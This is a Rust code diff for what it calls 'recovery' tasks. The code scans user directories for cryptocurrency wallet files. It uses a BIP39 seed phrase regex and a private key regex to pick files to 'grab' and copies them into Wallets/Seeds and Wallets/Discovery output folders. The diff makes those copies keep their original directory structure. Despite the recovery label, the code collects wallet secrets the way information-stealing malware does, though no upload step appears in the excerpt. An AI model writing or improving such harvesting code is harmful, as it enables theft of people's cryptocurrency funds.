@@ -166,7 +166,7 @@ impl RecoveryTask for WalletInventoryTask {
         )
         .await?;
 
-        Ok(vec![artifact])
+        Ok(artifact.into_iter().collect())
     }
 }
 
@@ -532,7 +532,7 @@ impl RecoveryTask for WalletPatternSearchTask {
 
     async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
         let mut artifacts = Vec::new();
-        let dest_root = wallet_output_dir(ctx, "Discovery").await?;
+        let dest_root = ctx.output_dir.join("Wallets").join("Discovery");
         let mut handles = Vec::new();
 
         for root in &self.user_roots {
@@ -546,9 +546,9 @@ impl RecoveryTask for WalletPatternSearchTask {
         }
 
         for handle in handles {
-            if let Ok(files) = handle.await {
+            if let Ok((root, files)) = handle.await {
                 for file in files {
-                    let _ = copy_file("Discovery", &file, &dest_root, &mut artifacts).await;
+                    let _ = crate::recovery::fs::copy_file_with_structure("Discovery", &file, &root, &dest_root, &mut artifacts).await;
                 }
             }
         }
@@ -557,9 +557,9 @@ impl RecoveryTask for WalletPatternSearchTask {
     }
 }
 
-fn perform_scan(root: PathBuf, depth: usize) -> Vec<PathBuf> {
+fn perform_scan(root: PathBuf, depth: usize) -> (PathBuf, Vec<PathBuf>) {
     let mut found = Vec::new();
-    let walker = WalkDir::new(root)
+    let walker = WalkDir::new(&root)
         .max_depth(depth)
         .follow_links(false)
         .into_iter()
@@ -576,7 +576,7 @@ fn perform_scan(root: PathBuf, depth: usize) -> Vec<PathBuf> {
             }
         }
     }
-    found
+    (root, found)
 }
 
 fn is_ignored(entry: &walkdir::DirEntry) -> bool {
@@ -615,7 +615,7 @@ impl RecoveryTask for SeedPhraseDiscoveryTask {
 
     async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
         let mut artifacts = Vec::new();
-        let dest_root = wallet_output_dir(ctx, "Seeds").await?;
+        let dest_root = ctx.output_dir.join("Wallets").join("Seeds");
 
         let bip39_regex = Regex::new(r"(?i)\b([a-z]{3,}\s+){11,23}[a-z]{3,}\b").unwrap();
         let priv_key_regex =
@@ -675,7 +675,7 @@ impl RecoveryTask for SeedPhraseDiscoveryTask {
                 }
 
                 if should_grab {
-                    let _ = copy_file("Seeds", path, &dest_root, &mut artifacts).await;
+                    let _ = crate::recovery::fs::copy_file_with_structure("Seeds", path, root, &dest_root, &mut artifacts).await;
                 }
             }
         }
@@ -718,7 +718,6 @@ async fn is_file_sensitive(path: &Path, bip39: &Regex, priv_key: &Regex) -> bool
 async fn wallet_output_dir(ctx: &RecoveryContext, label: &str) -> Result<PathBuf, RecoveryError> {
     let folder = ctx
         .output_dir
-        .join("services")
         .join("Wallets")
         .join(sanitize_label(label));
     fs::create_dir_all(&folder).await?;
